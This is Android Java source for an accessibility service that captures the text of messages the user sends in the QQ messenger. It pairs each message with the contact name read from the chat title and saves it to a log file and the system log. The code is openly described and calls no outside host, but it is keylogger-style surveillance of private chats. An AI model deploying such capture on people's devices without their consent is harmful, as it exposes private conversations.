package com.example.useranalysisapp.service;

import android.accessibilityservice.AccessibilityService;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Binder;
import android.os.IBinder;
import android.telephony.mbms.FileInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.TextView;
import android.widget.Toast;

import org.w3c.dom.Text;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.util.List;

/**
 * 获取QQ聊天界面发送消息的服务，仅限文本。
 * 所有消息用内部存储，放在Log.txt里。
 * 按照“消息内容 存储时间 联系人名称”格式存储，用一个空格隔开。
 */
public class MobileQQService extends AccessibilityService {

    //Debug方便区分用的常量
    private static final String DEBUG_TVC = "TYPE_VIEW_CLICKED: ";
    private static final String DEBUG_TVF = "TYPE_VIEW_FOCUSED: ";
    private static final String DEBUG_TVTC = "TYPE_VIEW_TEXT_CHANGED";

    private static final String TAG = "QQServiceSend";
    private String inputString = "[]";
    private String chatPerson = "unkown";

    public MobileQQService() {
    }

    /**
     * 手机qq改版后可能无法正常获取联系人名称。
     */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();
        CharSequence packageName = event.getPackageName();

        if(packageName.toString().equals("com.tencent.mobileqq")){

            switch(eventType){
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    inputString = event.getText().toString();

                    break;
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    if(!event.getText().toString().equals("[发送]")){
                        break;
                    }
                    //已确认是发送消息，保存输入框内容

                    String insideInputString = inputString.substring(1, inputString.length() - 1).trim();

                    //输入框内容非空
                    if(insideInputString.length() > 0){
                        final long sendTime = System.currentTimeMillis() / 1000;

                        String path = this.getExternalFilesDir("log").getAbsolutePath();
                        File newFile = new File(path + File.separator + "log.txt");
                        OutputStream os = null;
                        String content = insideInputString + " " + sendTime + " " + chatPerson;

                        Log.e(TAG, DEBUG_TVC+ content);

                        try {
                            os = new FileOutputStream(newFile);
                            os.write(content.getBytes());
                            os.flush();
                        } catch (IOException e) {
                            e.printStackTrace();
                        } finally {
                            try {
                                if(os!=null) {
                                    os.close();
                                }
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }
                    }

                    break;
                /*
                 * 获取聊天界面顶部文本，认为是联系人名称。
                 * 如果手机qq版本改变，ViewId可能会发生变化。
                 * 如果使用event.getText().toString()只能得到“[]”。
                 */
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                    List<AccessibilityNodeInfo> chatPersonList = rootNode.findAccessibilityNodeInfosByViewId("com.tencent.mobileqq:id/title");
                    if(chatPersonList.size() != 0){
                        AccessibilityNodeInfo chatPersonInfo = chatPersonList.get(0);
                        CharSequence chatPersonText = chatPersonInfo.getText();
                        if(chatPersonText != null){
                            chatPerson = chatPersonText.toString();
                        }
                    }
                    break;
                default:
                    break;
            }
        }
    }

    @Override
    public void onInterrupt() {

    }
}